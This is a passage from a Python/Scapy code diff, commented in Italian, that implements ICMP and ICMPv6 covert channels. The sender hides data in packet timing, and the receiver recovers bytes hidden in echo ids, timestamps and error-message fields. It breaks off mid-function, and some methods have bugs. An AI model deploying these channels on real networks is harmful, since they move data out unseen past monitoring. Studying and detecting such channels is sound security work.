+
+    def ipv6_timing_channel_1bit(self, data:bytes=None, addr_src=None, addr_dst=None): #Exec Time 0:14:46
+        #Nella comunicazione possono verificarsi turbolenze. 
+        #Per poter distinguere i due tempi la distanza deve essere adeguata. 
+        #Inoltre il tempo maggiore dovrà distare alemno 2d dal tempo minore 
+        if not com.is_bytes(data) or not com.is_IPAddress(addr_src) or not com.is_IPAddress(addr_dst):
+            raise Exception(f"Argoemnti non corretti")
+        if addr_dst.version!=6:
+            print(f"IP version is not 6: {addr_dst.version}")
+            return False
+        
+        TEMPO_0=3 #sec
+        DISTANZA_TEMPI=2 #sec
+        TEMPO_1=8 #sec
+        if TEMPO_0+DISTANZA_TEMPI*2>=TEMPO_1: 
+            raise ValueError("send_timing_channel: TEMPO_1 non valido")
+        TEMPO_BYTE=0*60 #minuti
+
+        TYPE_INFORMATION_REQUEST=128
+        TYPE_INFORMATION_REPLY=129
+        
+        try:
+            interface,_= mymethods.iface_src_from_IP(addr_dst) 
+            if interface is None:  
+                interface=mymethods.default_iface()
+                com.ping_once(addr_dst,interface)
+            interface,_= mymethods.iface_src_from_IP(addr_dst)
+            if interface is None:
+                raise Exception("Problema con l'interfaccia non risolto")  
+        except Exception as e: 
+            interface=mymethods.default_iface() 
+        dst_mac=com.get_mac_by_ipv6(addr_dst.compressed, addr_src.compressed, interface)  
+        src_mac = get_if_hwaddr(interface) 
+        
+        midnight = datetime.datetime.now(datetime.timezone.utc).replace(hour=0, minute=0, second=0, microsecond=0) 
+        bit_data=[]
+        for piece_data in data: #BIG ENDIAN
+            bit_data.append([(piece_data >> index) & 1 for index in range(8)]) #LSB
+            #bit_data.append([(piece_data >> index) & 1 for index in reversed(range(8))]) #MSB
+            bit_piece_data=[(piece_data >> index) & 1 for index in range(8)]
+        
+        start_time=datetime.datetime.now(datetime.timezone.utc) 
+        pkt= (
+            Ether(dst=dst_mac, src=src_mac) /
+            IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed) /
+            ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY) /
+            Raw(load="Hello Neighbour".encode())
+        ) 
+        #print(f"Sending {pkt.summary()} through interface {interface}")  
+        ans = sendp(pkt, verbose=1,iface=interface)  
+        for piece_bit_data in bit_data:
+            for bit in piece_bit_data:
+                if bit: 
+                    time.sleep(TEMPO_1) 
+                else: 
+                    time.sleep(TEMPO_0)
+                current_time=datetime.datetime.now(datetime.timezone.utc)
+                pkt= (
+                    Ether(dst=dst_mac, src=src_mac) /
+                    IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed) /
+                    ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY) /
+                    Raw()
+                ) 
+                #print(f"Sending {pkt.summary()} through interface {interface}")  
+                ans = sendp(pkt, verbose=1,iface=interface) 
+            time.sleep(TEMPO_BYTE)
+        end_time=datetime.datetime.now(datetime.timezone.utc) 
+    
+    def ipv6_timing_channel_2bit(self, data:bytes=None, addr_src=None, addr_dst=None): #Exec Time 12:08
+        #Nella comunicazione possono verificarsi turbolenze. 
+        #Per poter distinguere i due tempi la distanza deve essere adeguata. 
+        #Inoltre il tempo maggiore dovrà distare alemno 2d dal tempo minore
+        if not com.is_bytes(data) or not com.is_IPAddress(addr_src) or not com.is_IPAddress(addr_dst):
+            raise Exception(f"Argoemnti non corretti")
+        if addr_dst.version!=6:
+            print(f"IP version is not 6: {addr_dst.version}")
+            return False
+        
+        DISTANZA_TEMPI=2 #sec
+        TEMPI_CODICI=[3+index*2*DISTANZA_TEMPI for index in range(2**2)] #00, 01, 10, 11
+        #TEMPO_00=3, TEMPO_01=TEMPO_00+2*DISTANZA_TEMPI, TEMPO_10=TEMPO_01+2*DISTANZA_TEMPI, TEMPO_11=TEMPO_10+2*DISTANZA_TEMPI
+        TEMPO_BYTE=0*60 #minuti  
+        
+        TYPE_INFORMATION_REQUEST=128
+        TYPE_INFORMATION_REPLY=129
+
+        try:
+            interface,_= mymethods.iface_src_from_IP(addr_dst) 
+            if interface is None:  
+                interface=mymethods.default_iface()
+                com.ping_once(addr_dst,interface)
+            interface,_= mymethods.iface_src_from_IP(addr_dst)
+            if interface is None:
+                raise Exception("Problema con l'interfaccia non risolto")  
+        except Exception as e: 
+            interface=mymethods.default_iface() 
+        dst_mac=com.get_mac_by_ipv6(addr_dst.compressed, addr_src.compressed, interface)  
+        src_mac = get_if_hwaddr(interface) 
+        
+        midnight = datetime.datetime.now(datetime.timezone.utc).replace(hour=0, minute=0, second=0, microsecond=0)  
+        bit_data=[]
+        for piece_data in data: #BIG ENDIAN
+            bit_data.append([(piece_data >> index) & 1 for index in range(8)]) #LSB
+            #bit_data.append([(piece_data >> index) & 1 for index in reversed(range(8))]) #MSB
+            bit_piece_data=[(piece_data >> index) & 1 for index in range(8)]
+            
+        start_time=datetime.datetime.now(datetime.timezone.utc)
+        pkt= (
+            Ether(dst=dst_mac, src=src_mac) /
+            IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed) /
+            ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY) /
+            Raw()
+        ) 
+        #print(f"Sending {pkt.summary()} through interface {interface}")  
+        ans = sendp(pkt, verbose=1,iface=interface)  
+        for piece_bit_data in bit_data:
+            for bit1, bit2 in zip(piece_bit_data[0::2], piece_bit_data[1::2]): 
+                time.sleep(TEMPI_CODICI[(bit1<<1)+bit2]) 
+                current_time=datetime.datetime.now(datetime.timezone.utc)
+                pkt= (
+                    Ether(dst=dst_mac, src=src_mac) /
+                    IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed) /
+                    ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY) /
+                    Raw()
+                ) 
+                #print(f"Sending {pkt.summary()} through interface {interface}")  
+                ans = sendp(pkt, verbose=1,iface=interface)  
+            time.sleep(TEMPO_BYTE)
+        end_time=datetime.datetime.now(datetime.timezone.utc) 
+    
+    def ipv6_timing_channel_4bit(self, data:bytes=None, addr_src=None, addr_dst=None): #Exec Time 0:22:20.745110 
+        #Nella comunicazione possono verificarsi turbolenze. 
+        #Per poter distinguere i due tempi la distanza deve essere adeguata. 
+        #Inoltre il tempo maggiore dovrà distare alemno 2d dal tempo minore
+        if not com.is_bytes(data) or not com.is_IPAddress(addr_src) or not com.is_IPAddress(addr_dst):
+            raise Exception(f"Argoemnti non corretti")
+        if addr_dst.version!=6:
+            print(f"IP version is not 6: {addr_dst.version}")
+            return False
+        
+        DISTANZA_TEMPI=2 #sec
+        TEMPI_CODICI=[3+index*2*DISTANZA_TEMPI for index in range(4**2)] #0000, 0001, 0010, 0011,...,1111
+        TEMPO_BYTE=0*60 #minuti 
+        
+        TYPE_INFORMATION_REQUEST=128
+        TYPE_INFORMATION_REPLY=129
+        midnight = datetime.datetime.now(datetime.timezone.utc).replace(hour=0, minute=0, second=0, microsecond=0)
+        try:
+            interface,_= mymethods.iface_src_from_IP(addr_dst) 
+            if interface is None:  
+                interface=mymethods.default_iface()
+                com.ping_once(addr_dst,interface)
+            interface,_= mymethods.iface_src_from_IP(addr_dst)
+            if interface is None:
+                raise Exception("Problema con l'interfaccia non risolto")  
+        except Exception as e: 
+            interface=mymethods.default_iface() 
+        dst_mac=com.get_mac_by_ipv6(addr_dst.compressed, addr_src.compressed, interface)  
+        src_mac = get_if_hwaddr(interface) 
+        
+        midnight = datetime.datetime.now(datetime.timezone.utc).replace(hour=0, minute=0, second=0, microsecond=0)  
+        bit_data=[]
+        for piece_data in data: #BIG ENDIAN
+            bit_data.append([(piece_data >> index) & 1 for index in range(8)]) #LSB
+            #bit_data.append([(piece_data >> index) & 1 for index in reversed(range(8))]) #MSB
+            bit_piece_data=[(piece_data >> index) & 1 for index in range(8)] 
+        
+        start_time=datetime.datetime.now(datetime.timezone.utc)
+        pkt= (
+            Ether(dst=dst_mac, src=src_mac) /
+            IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed) /
+            ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY) /
+            Raw()
+        ) 
+        #print(f"Sending {pkt.summary()} through interface {interface}")  
+        ans = sendp(pkt, verbose=1,iface=interface)  
+        for piece_bit_data in bit_data:
+            for bit1, bit2,bit3,bit4 in zip(piece_bit_data[0::4], piece_bit_data[1::4],piece_bit_data[2::4], piece_bit_data[3::4]):
+                index=bit1<<3 | bit2<<2 |  bit3<<1 | bit4  
+                time.sleep(TEMPI_CODICI[index])  
+                pkt= (
+                    Ether(dst=dst_mac, src=src_mac) /
+                    IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed) /
+                    ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY) /
+                    Raw()
+                ) 
+                #print(f"Sending {pkt.summary()} through interface {interface}")  
+                ans = sendp(pkt, verbose=1,iface=interface)
+            time.sleep(TEMPO_BYTE)
+        end_time=datetime.datetime.now(datetime.timezone.utc) 
+    
+#-----------------------------------------------------------------------
+class ReceiveSingleton(): 
+
+    def callback_ipv4_information_request(self, event_pktconn,data):
+        def callback(packet): 
+            if packet.haslayer(IP) and packet.haslayer(ICMP):  
+                if packet[ICMP].id==0 and packet[ICMP].seq==1: 
+                    com.set_threading_Event(event_pktconn)
+                    return
+                icmp_id=packet[ICMP].id
+                byte1 = (icmp_id >> 8) & 0xFF 
+                byte2 = icmp_id & 0xFF  
+                data.extend([chr(byte1),chr(byte2)]) 
+        return callback 
+    
+    def ipv4_information_request(self, ip_host):
+        if not com.is_IPAddress(ip_host): 
+            raise Exception(f"Argoemnti non corretti")
+        
+        information_data=[]
+        TYPE_INFORMATION_REQUEST=15
+        TYPE_INFORMATION_REPLY=16
+        
+        try: 
+            event_pktconn=com.get_threading_Event()
+            interface= mymethods.default_iface() 
+        except Exception as e:
+            raise Exception(f"Exception: {e}")
+        args={
+                "filter":f"icmp and (icmp[0]=={TYPE_INFORMATION_REQUEST} or icmp[0]=={TYPE_INFORMATION_REPLY}) and dst {ip_host.compressed}" 
+                #,"count":1 
+                ,"prn":self.callback_ipv4_information_request( event_pktconn,information_data)
+                #,"store":True 
+                ,"iface":interface
+            }
+        try: 
+            sniffer,pkt_timer=com.sniff_packet(
+                args
+                ,timeout_time=None
+                ,event=event_pktconn
+            ) 
+            com.wait_threading_Event(event_pktconn) 
+        except Exception as e:
+            raise Exception(f"wait_conn_from_attacker: {e}")
+        com.stop_sinffer(sniffer)
+        if com.stop_timer(pkt_timer): 
+            #print("".join(x for x in information_data))
+            return True 
+        return False  
+    
+
+    def callback_get_timestamp_request(event_pktconn,data):
+        def callback(packet): 
+            if packet.haslayer(IP) and packet.haslayer(ICMP): 
+                if packet[ICMP].id==0 and packet[ICMP].seq==1: 
+                    com.set_threading_Event(event_pktconn)
+                    return
+                icmp_id=packet[ICMP].id
+                byte1 = (icmp_id >> 8) & 0xFF 
+                byte2 = icmp_id & 0xFF  
+                data.extend([chr(byte1),chr(byte2)]) 
+            
+                icmp_ts_ori=str(packet[ICMP].ts_ori)[-3:]  
+                icmp_ts_rx=str(packet[ICMP].ts_rx)[-3:]  
+                icmp_ts_tx=str(packet[ICMP].ts_tx)[-3:] 
+
+                data.extend([chr(int(icmp_ts_ori)),chr(int(icmp_ts_rx)), chr(int(icmp_ts_tx))]) 
+        return callback
+    
+    def ipv4_timestamp_request(self, ip_host): 
+        if not com.is_IPAddress(ip_host): 
+            raise Exception(f"Argoemnti non corretti")
+        
+        timestamp_data=[]
+        TYPE_TIMESTAMP_REQUEST=13
+        TYPE_TIMESTAMP_REPLY=14 
+        try: 
+            event_pktconn=com.get_threading_Event()
+            interface= mymethods.default_iface() 
+        except Exception as e:
+            raise Exception(f"Exception: {e}")
+        args={
+                "filter":f"icmp and (icmp[0]=={TYPE_TIMESTAMP_REQUEST} or icmp[0]=={TYPE_TIMESTAMP_REPLY}) and dst {ip_host.compressed}" 
+                #,"count":1 
+                ,"prn":self.callback_get_timestamp_request(event_pktconn,timestamp_data)
+                #,"store":True 
+                ,"iface":interface
+            }
+        try: 
+            sniffer,pkt_timer=com.sniff_packet(
+                args
+                ,timeout_time=None
+                ,event=event_pktconn
+            ) 
+            com.wait_threading_Event(event_pktconn) 
+        except Exception as e:
+            raise Exception(f"wait_conn_from_attacker: {e}")
+        com.stop_sinffer(sniffer)
+        if com.stop_timer(pkt_timer): 
+            #print("".join(x for x in timestamp_data))
+            return True 
+        return False  
+    
+
+    def callback_get_redirect_message(event_pktconn,data):
+        TYPE_REDIRECT=5
+        def callback(packet): 
+            if packet.haslayer(IP) and packet.haslayer(ICMP) :
+                if packet[ICMP].haslayer(IPerror) and packet[ICMP].haslayer(ICMPerror): 
+                    icmp_ip_length=packet[ICMP][IPerror].len
+                    data.append(icmp_ip_length.to_bytes(2,"big").decode()) 
+
+                    icmp_icmp_id=packet[ICMP][ICMPerror].id 
+                    data.append(icmp_icmp_id.to_bytes(2,"big").decode()) 
+                    if packet[ICMP][ICMPerror].id==0 and packet[ICMP][ICMPerror].seq==1: 
+                        com.set_threading_Event(event_pktconn)
+                        return
+                elif packet[ICMP].type==TYPE_REDIRECT and not packet[ICMP].haslayer(IPerror): 
+                    com.set_threading_Event(event_pktconn)
+                    return
+        return callback
+    
+    def ipv4_redirect(self, ip_host): 
+        if not com.is_IPAddress(ip_host): 
+            raise Exception(f"Argoemnti non corretti")
+        
+        redirect_data=[]
+        TYPE_REDIRECT=5 
+        try: 
+            event_pktconn=com.get_threading_Event()
+            interface= mymethods.default_iface() 
+        except Exception as e:
+            raise Exception(f"Exception: {e}")
+        args={
+                "filter":f"icmp and (icmp[0]=={TYPE_REDIRECT}) and dst {ip_host.compressed}" 
+                #,"count":1 
+                ,"prn": self.callback_get_redirect_message(event_pktconn,redirect_data)
+                #,"store":True 
+                ,"iface":interface
+        } 
+        try: 
+            sniffer,pkt_timer=com.sniff_packet(
+                args
+                ,timeout_time=None
+                ,event=event_pktconn
+            ) 
+            com.wait_threading_Event(event_pktconn) 
+        except Exception as e:
+            raise Exception(f"wait_conn_from_attacker: {e}")
+        com.stop_sinffer(sniffer)
+        if com.stop_timer(pkt_timer): 
+            #print("".join(x for x in redirect_data))
+            return True 
+        return False  
+    
+
+    def callback_get_source_quench(event_pktconn,data):
+        TYPE_SOURCE_QUENCH=4  
+        def callback(packet): 
+            if packet.haslayer(IP) and packet.haslayer(ICMP): 
+                if packet[ICMP].haslayer(IPerror) and packet[ICMP].haslayer(ICMPerror): 
+                    data.append(packet[ICMP].unused.to_bytes(4,"big").decode())  
+                    data.append(packet[ICMP][IPerror].len.to_bytes(2,"big").decode())  
+                    data.append(packet[ICMP][ICMPerror].id .to_bytes(2,"big").decode()) 
+                    if packet[ICMP][ICMPerror].id==0 and packet[ICMP][ICMPerror].seq==1: 
+                        com.set_threading_Event(event_pktconn)
+                        return
+                elif packet[ICMP].type==TYPE_SOURCE_QUENCH and not packet[ICMP].haslayer(IPerror): 
+                    com.set_threading_Event(event_pktconn)
+                    return
+        return callback
+
+    def ipv4_source_quench(self, ip_host): 
+        if not com.is_IPAddress(ip_host): 
+            raise Exception(f"Argoemnti non corretti")
+        source_quench_data=[]
+        TYPE_SOURCE_QUENCH=4   
+        try: 
+            self.event_pktconn=com.get_threading_Event()
+            interface= mymethods.default_iface() 
+        except Exception as e:
+            raise Exception(f"Exception: {e}")
+        args={
+                "filter":f"icmp and (icmp[0]=={TYPE_SOURCE_QUENCH}) and dst {ip_host.compressed}" 
+                #,"count":1 
+                ,"prn": self.callback_get_source_quench(self.event_pktconn,source_quench_data)
+                #,"store":True 
+                ,"iface":interface
+        } 
+        try: 
+            sniffer,pkt_timer=com.sniff_packet(
+                args
+                ,timeout_time=None
+                ,event=self.event_pktconn
+            ) 
+            com.wait_threading_Event(self.event_pktconn) 
+        except Exception as e:
+            raise Exception(f"wait_conn_from_attacker: {e}")
+        com.stop_sinffer(sniffer)
+        if com.stop_timer(pkt_timer): 
+            #print("".join(x for x in source_quench_data))
+            return True 
+        return False  
+    
+
+    def callback_get_parameter_problem(event_pktconn,data):
+        TYPE_SOURCE_QUENCH=4  
+        def callback(packet): 
+            if packet.haslayer(IP) and packet.haslayer(ICMP): 
+                if packet[ICMP].haslayer(IPerror) and packet[ICMP].haslayer(ICMPerror): 
+                    data.append(packet[ICMP].ptr.to_bytes(1,"big").decode())
+                    data.append(packet[ICMP].unused.to_bytes(2,"big").decode())  
+                    data.append(packet[ICMP][IPerror].len.to_bytes(2,"big").decode())  
+                    data.append(packet[ICMP][ICMPerror].id.to_bytes(2,"big").decode()) 
+                    if packet[ICMP][ICMPerror].id==0 and packet[ICMP][ICMPerror].seq==1: 
+                        com.set_threading_Event(event_pktconn)
+                        return
+                elif packet[ICMP].type==TYPE_SOURCE_QUENCH and not packet[ICMP].haslayer(IPerror): #packet.haslayer(Padding):
+                    com.set_threading_Event(event_pktconn)
+                    return
+        return callback
+
+    def ipv4_parameter_problem(self, ip_host): 
+        if not com.is_IPAddress(ip_host): 
+            raise Exception(f"Argoemnti non corretti")
+        parameter_problem_data=[]
+        TYPE_PARAMETER_PROBLEM=12 
+        try: 
+            event_pktconn=com.get_threading_Event()
+            interface= mymethods.default_iface() 
+        except Exception as e:
+            raise Exception(f"Exception: {e}")
+        args={
+                "filter":f"icmp and (icmp[0]=={TYPE_PARAMETER_PROBLEM}) and dst {ip_host.compressed}" 
+                #,"count":1 
+                ,"prn": self.callback_get_parameter_problem(event_pktconn,parameter_problem_data)
+                #,"store":True 
+                ,"iface":interface
+        } 
+        try:
+            event_pktconn=com.get_threading_Event()
+            sniffer,pkt_timer=com.sniff_packet(
+                args
+                ,timeout_time=None
+                ,event=event_pktconn
+            ) 
+            com.wait_threading_Event(event_pktconn) 
+        except Exception as e:
+            raise Exception(f"wait_conn_from_attacker: {e}")
+        com.stop_sinffer(sniffer)
+        if com.stop_timer(pkt_timer): 
+            #print("".join(x for x in parameter_problem_data))
+            return True 
+        return False  
+    
+
+    def callback_get_time_exceeded(event_pktconn,data):
+        TYPE_TIME_EXCEEDED=11  
+        def callback(packet): 
+            if packet.haslayer(IP) and packet.haslayer(ICMP): 
+                if packet[ICMP].haslayer(IPerror) and packet[ICMP].haslayer(ICMPerror): 
+                    data.append(packet[ICMP].unused.to_bytes(2,"big").decode())  
+                    data.append(packet[ICMP][IPerror].len.to_bytes(2,"big").decode())  
+                    data.append(packet[ICMP][ICMPerror].id.to_bytes(2,"big").decode()) 
+                    if packet[ICMP][ICMPerror].id==0 and packet[ICMP][ICMPerror].seq==1: 
+                        com.set_threading_Event(event_pktconn)
+                        return
+                elif packet[ICMP].type==TYPE_TIME_EXCEEDED and not packet[ICMP].haslayer(IPerror): 
+                    com.set_threading_Event(event_pktconn)
+                    return
+        return callback
+
+    def ipv4_time_exceeded(self, ip_host): 
+        if not com.is_IPAddress(ip_host): 
+            raise Exception(f"Argoemnti non corretti")
+        time_exceeded_data=[]
+        TYPE_TIME_EXCEEDED=11 
+        try: 
+            event_pktconn=com.get_threading_Event()
+            interface= mymethods.default_iface() 
+        except Exception as e:
+            raise Exception(f"Exception: {e}")
+        args={
+                "filter":f"icmp and (icmp[0]=={TYPE_TIME_EXCEEDED}) and dst {ip_host.compressed}" 
+                #,"count":1 
+                ,"prn": self.callback_get_time_exceeded(event_pktconn,time_exceeded_data)
+                #,"store":True 
+                ,"iface":interface
+        } 
+        try:
+            event_pktconn=com.get_threading_Event()
+            sniffer,pkt_timer=com.sniff_packet(
+                args
+                ,timeout_time=None
+                ,event=event_pktconn
+            ) 
+            com.wait_threading_Event(event_pktconn) 
+        except Exception as e:
+            raise Exception(f"wait_conn_from_attacker: {e}")
+        com.stop_sinffer(sniffer)
+        if com.stop_timer(pkt_timer): 
+            #print("".join(x for x in time_exceeded_data))
+            return True 
+        return False  
+    
+
+    def callback_get_destination_unreachable(event_pktconn,data):
+        TYPE_DESTINATION_UNREACHABLE=3 
+        def callback(packet): 
+            if packet.haslayer(IP) and packet.haslayer(ICMP): 
+                if packet[ICMP].haslayer(IPerror) and packet[ICMP].haslayer(ICMPerror): 
+                    data.append(packet[ICMP].unused.decode())  
+                    data.append(packet[ICMP][IPerror].len.to_bytes(2,"big").decode())  
+                    data.append(packet[ICMP][ICMPerror].id.to_bytes(2,"big").decode()) 
+                    if packet[ICMP][ICMPerror].id==0 and packet[ICMP][ICMPerror].seq==1: 
+                        com.set_threading_Event(event_pktconn)
+                        return
+                elif packet[ICMP].type==TYPE_DESTINATION_UNREACHABLE and not packet[ICMP].haslayer(IPerror): #packet.haslayer(Padding):
+                    com.set_threading_Event(event_pktconn)
+                    return
+        return callback
+
+    def ipv4_destination_unreachable(self, ip_host): 
+        if not com.is_IPAddress(ip_host): 
+            raise Exception(f"Argoemnti non corretti")
+        destination_unreachable_data=[]
+        TYPE_DESTINATION_UNREACHABLE=3  
+        try: 
+            event_pktconn=com.get_threading_Event()
+            interface= mymethods.default_iface() 
+        except Exception as e:
+            raise Exception(f"Exception: {e}")
+        args={
+                "filter":f"icmp and (icmp[0]=={TYPE_DESTINATION_UNREACHABLE}) and dst {ip_host.compressed}" 
+                #,"count":1 
+                ,"prn":self.callback_get_destination_unreachable(event_pktconn,destination_unreachable_data)
+                #,"store":True 
+                ,"iface":interface
+        } 
+        try:
+            event_pktconn=com.get_threading_Event()
+            sniffer,pkt_timer=com.sniff_packet(
+                args
+                ,timeout_time=None
+                ,event=event_pktconn
+            ) 
+            com.wait_threading_Event(event_pktconn) 
+        except Exception as e:
+            raise Exception(f"wait_conn_from_attacker: {e}")
+        com.stop_sinffer(sniffer)
+        if com.stop_timer(pkt_timer): 
+            #print("".join(x for x in destination_unreachable_data))
+            return True 
+        return False  
+    
+
+    def timeout_timing_covertchannel(event_pktconn): 
+        com.set_threading_Event(event_pktconn)
+        return
+
+    def callback_get_timing_cc(callback_function, event_pktconn,timer,timing_data=[],previous_time=None, numero_bit=0): 
+        if numero_bit<=0:
+            return None   
+
+        DISTANZA_TEMPI=2 #sec
+        dict_tempi={}
+        dict_tempi.update( [("TEMPO_"+str(index), 3+index*2*DISTANZA_TEMPI)  for index in range(2**numero_bit)])
+        dict_bit={ }
+        dict_bit.update([ ("TEMPO_"+str(index), index)  for index in range(2**numero_bit) ])  
+
+        MINUTE_TIME=0*60+30 #minuti
+        MAX_TIME=max([value for _,value in dict_tempi.items()])+5 
+    
+        def callback(packet):
+            nonlocal previous_time, timer,timing_data, event_pktconn, callback_function
+            nonlocal MAX_TIME, MINUTE_TIME 
+            if previous_time is None: 
+                previous_time=packet.time 
+                timer.cancel()
+                timer=com.get_timeout_timer(MAX_TIME,callback_function) 
+                timer.start() 
+                return  
+            if packet.time is not None: 
+                delta_time=packet.time-previous_time   
+                arr=arr=[(key, abs(delta_time-value)) for key,value in dict_tempi.items()] 
+                min_value=min([y for _,y in arr]) 
+                min_indices = [i for i, v in enumerate(arr) if v[1] == min_value] 
+                timing_data.append(dict_bit.get(arr[min_indices[0]][0]))
+                previous_time=packet.time
+                timer.cancel() 
+                if len(timing_data)%8==0: 
+                    timer=com.get_timeout_timer(MINUTE_TIME,callback_function) 
+                else:
+                    timer=com.get_timeout_timer(MAX_TIME,callback_function) 
+                timer.start()
+        return callback
+
+    def ipv4_timing_cc(self, ip_host, numero_bit=0): 
+        if not com.is_IPAddress(ip_host): 
+            raise Exception(f"Argoemnti non corretti")
+        try:  
+            interface= mymethods.default_iface()  
+            if numero_bit<=0:
+                raise Exception("Numero di bit passato non valido")
+        except Exception as e:
+            raise Exception(f"Exception: {e}")
+        
+        timing_data=[]
+        TYPE_ECHO_REQUEST=8
+        TYPE_ECHO_REPLY=0 
+        last_packet_time=None  
+        try: 
+            event_pktconn=com.get_threading_Event()
+            callback_function=lambda: self.timeout_timing_covertchannel(event_pktconn)
+            timer_timing_CC=com.get_timeout_timer(None,callback_function) 
+        except Exception as e:
+            raise Exception(f"Exception: {e}") 
+        args={
+                "filter":f"icmp and (icmp[0]=={TYPE_ECHO_REQUEST} or icmp[0]=={TYPE_ECHO_REPLY}) and dst {ip_host.compressed}" 
+                #,"count":1 
+                ,"prn": self.callback_get_timing_cc(
+                    callback_function
+                    ,event_pktconn
+                    ,timer_timing_CC
+                    ,timing_data
+                    ,last_packet_time
+                    ,numero_bit
+                )
+                #,"store":True 
+                ,"iface":interface
+        }  
+        try: 
+            sniffer,pkt_timer=com.sniff_packet(
+                args
+                ,timeout_time=None
+                ,event=event_pktconn
+            )  
+            com.wait_threading_Event(event_pktconn) 
+            str_data=""
+            for integer in timing_data:
+                str_data+=format(integer, f'0{numero_bit}b') 
+            data="" 
+            for index in range(0, len(str_data), 8):
+                int_data=0
+                for bit in str_data[index:index+8][::-1]:
+                    int_data=int_data<<1|int(bit)
+                data+=chr(int_data)
+        except Exception as e:
+            raise Exception(f"wait_conn_from_attacker: {e}")
+        com.stop_sinffer(sniffer)
+        if com.stop_timer(pkt_timer):  
+            return True 
+        return False
+
+    #---------------------
+    def callback_get_information_request(event_pktconn,data):
+        def callback(packet): 
+            if packet.haslayer(IPv6) and (packet.haslayer(ICMPv6EchoReply) or packet.haslayer(ICMPv6EchoRequest)): 
+                icmp_echo_type=(
+                    "ICMPv6EchoReply" if packet.haslayer(ICMPv6EchoReply) 
+                    else "ICMPv6EchoRequest" if packet.haslayer(ICMPv6EchoRequest) 
+                    else None
+                ) 
+                if packet[icmp_echo_type].id==0 and packet[icmp_echo_type].seq==1: 
+                    com.set_threading_Event(event_pktconn)
+                    return
+                icmp_id=packet[icmp_echo_type].id
+                byte1 = (icmp_id >> 8) & 0xFF 
+                byte2 = icmp_id & 0xFF 
+                data.extend([chr(byte1),chr(byte2)]) 
+        return callback
+
+    def ipv6_information_request(self, ip_host): 
+        if not com.is_IPAddress(ip_host): 
+            raise Exception(f"Argoemnti non corretti")
+        
+        information_data=[]
+        TYPE_INFORMATION_REQUEST=128
+        TYPE_INFORMATION_REPLY=129  
+        #ip_google=socket.getaddrinfo("www.google.com", None, socket.AF_UNSPEC)
+        #print("IP_GOOGLE: ",ip_google)
+        try: 
+            event_pktconn=com.get_threading_Event()
+            interface= mymethods.default_iface() 
+        except Exception as e:
+            raise Exception(f"Exception: {e}")
+        args={
+                "filter":f"icmp6 and (icmp6[0]=={TYPE_INFORMATION_REQUEST} or icmp6[0]=={TYPE_INFORMATION_REPLY}) and dst {ip_host.compressed}" 
+                #,"count":1 
+                ,"prn": self.callback_get_information_request(event_pktconn,information_data)
+                #,"store":True 
+                ,"iface": interface
+            }
+        try: 
+            sniffer,pkt_timer=com.sniff_packet(
+                args
+                ,timeout_time=None
+                ,event=event_pktconn
+            ) 
+            com.wait_threading_Event(event_pktconn) 
+        except Exception as e:
+            raise Exception(f"get_information_request: {e}")
+        com.stop_sinffer(sniffer)
+        if com.stop_timer(pkt_timer): 
+            #print("".join(x for x in information_data))
+            return True 
+        return False  
+    
+
+    def callback_get_parameter_problem(event_pktconn,data): 
+        TYPE_INFORMATION_REPLY=129
+        TYPE_PARAMETER_PROBLEM=4  
+        def callback(packet): 
+            field=None 
+            if (layer:=packet.getlayer("IPv6")) is not None: 
+                if (layer:=layer.getlayer("ICMPv6ParamProblem")) is not None: 
+                    if (field:=layer.getfieldval("ptr")) is not None and field!=0xffffffff: 
+                        data.append(field.to_bytes(4,"big").decode()) 
+                    elif field is not None and field==0xffffffff: 
+                        com.set_threading_Event(event_pktconn)
+                        return 
+                if (layer:=layer.getlayer("IPerror6")) is not None: 
+                    if (field:=layer.getfieldval("plen")) is not None: 
+                        data.append(field.to_bytes(2,"big").decode())
+                layer=(
+                    layer.getlayer("ICMPv6EchoRequest") if layer.getlayer("ICMPv6EchoReply") is None 
+                    else layer.getlayer("ICMPv6EchoReply")
+                )
+                if layer is not None: 
+                    if (field:=layer.getfieldval("id")) is not None: 
+                        data.append(field.to_bytes(2,"big").decode()) 
+        return callback
+
+    def ipv6_parameter_problem(self, ip_host): 
+        if not com.is_IPAddress(ip_host): 
+            raise Exception(f"Argoemnti non corretti")
+        
+        parameter_problem_data=[]
+        TYPE_PARAMETER_PROBLEM=4   
+        try: 
+            event_pktconn=com.get_threading_Event()
+            interface= mymethods.default_iface() 
+        except Exception as e:
+            raise Exception(f"Exception: {e}")
+        args={
+                "filter":f"icmp6 and (icmp6[0]=={TYPE_PARAMETER_PROBLEM}) and dst {ip_host.compressed}" 
+                #,"count":1 
+                ,"prn": self.callback_get_parameter_problem(event_pktconn,parameter_problem_data)
+                #,"store":True 
+                ,"iface":interface
+        } 
+        try: 
+            sniffer,pkt_timer=com.sniff_packet(
+                args
+                ,timeout_time=None
+                ,event=event_pktconn
+            ) 
+            com.wait_threading_Event(event_pktconn) 
+        except Exception as e:
+            raise Exception(f"get_parameter_problem: {e}")
+        com.stop_sinffer(sniffer)
+        if com.stop_timer(pkt_timer): 
+            #print("".join(x for x in parameter_problem_data))
+            return True 
+        return False  
+    
+
+    def callback_get_time_exceeded(event_pktconn,data):
+        TYPE_TIME_EXCEEDED=3  
+        def callback(packet): 
+            field=None 
+            if (layer:=packet.getlayer("IPv6")) is not None: 
+                if (layer:=layer.getlayer("IPerror6")) is not None: 
+                    if (field:=layer.getfieldval("plen")) is not None and field!=0xffff: 
+                        data.append(field.to_bytes(2,"big").decode())
+                    elif field is not None and field==0xffff: 
+                        com.set_threading_Event(event_pktconn)
+                        return
+                layer=(
+                    layer.getlayer("ICMPv6EchoRequest") if layer.getlayer("ICMPv6EchoReply") is None 
+                    else layer.getlayer("ICMPv6EchoReply")
+                )
+                if layer is not None: 
+                    if (field:=layer.getfieldval("id")) is not None and not (field==0 and layer.getfieldval("seq")!=0): 
+                        data.append(field.to_bytes(2,"big").decode()) 
+                    elif field is not None and (field==0 and layer.getfieldval("seq")==1): 
